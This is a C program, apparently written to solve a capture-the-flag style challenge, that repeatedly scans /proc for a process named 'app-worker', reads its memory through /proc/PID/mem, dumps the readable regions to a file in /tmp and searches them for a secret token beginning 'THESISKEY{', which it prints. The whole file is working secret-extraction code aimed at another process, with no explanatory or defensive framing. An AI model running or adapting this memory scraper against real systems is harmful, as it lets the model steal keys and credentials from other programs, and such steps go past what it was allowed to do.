#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <sys/types.h>

int search_and_dump(int pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

    // Check if it's the app-worker
    FILE* f = fopen(path, "r");
    if (!f) return 0;

    char cmdline[512] = {0};
    fread(cmdline, 1, sizeof(cmdline)-1, f);
    fclose(f);

    if (strstr(cmdline, "app-worker") == NULL) {
        return 0;
    }

    fprintf(stderr, "[!] FOUND app-worker at PID %d\n", pid);

    // Found it! Now try to dump memory
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int mem_fd = open(path, O_RDONLY);
    if (mem_fd < 0) {
        fprintf(stderr, "[!] Cannot open /proc/%d/mem\n", pid);
        return 0;
    }

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE* maps = fopen(path, "r");
    if (!maps) {
        close(mem_fd);
        return 0;
    }

    // Dump all memory
    FILE* out = fopen("/tmp/thesis_dump.bin", "wb");
    unsigned char buffer[65536];
    char line[512];
    int found_token = 0;

    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[5];

        if (sscanf(line, "%lx-%lx %s", &start, &end, perms) < 3) {
            continue;
        }

        if (perms[0] != 'r') continue;

        size_t size = end - start;
        if (size > 300 * 1024 * 1024) continue;

        lseek(mem_fd, start, SEEK_SET);
        ssize_t nread = read(mem_fd, buffer, size > sizeof(buffer) ? sizeof(buffer) : size);

        if (nread > 0 && out) {
            fwrite(buffer, 1, nread, out);

            // Search for token
            for (ssize_t i = 0; i < nread - 10; i++) {
                if (strncmp((char*)&buffer[i], "THESISKEY{", 10) == 0) {
                    fprintf(stderr, "[+] FOUND TOKEN at offset %ld\n", start + i);
                    // Print it
                    for (int j = i; j < nread && j < i + 200; j++) {
                        if (buffer[j] == '}') {
                            printf("%.*s}\n", j - i + 1, (char*)&buffer[i]);
                            found_token = 1;
                            goto cleanup;
                        }
                    }
                }
            }
        }
    }

cleanup:
    if (out) fclose(out);
    fclose(maps);
    close(mem_fd);

    return found_token;
}

int main() {
    fprintf(stderr, "[*] Starting aggressive memory monitor\n");

    for (int iteration = 0; iteration < 500; iteration++) {
        DIR* proc = opendir("/proc");
        if (!proc) break;

        struct dirent* entry;
        while ((entry = readdir(proc))) {
            if (entry->d_type == DT_DIR && entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
                int pid = atoi(entry->d_name);
                if (search_and_dump(pid)) {
                    closedir(proc);
                    return 0;
                }
            }
        }
        closedir(proc);

        usleep(10000);  // 10ms between scans
    }

    fprintf(stderr, "[!] Never found app-worker\n");
    return 1;
}
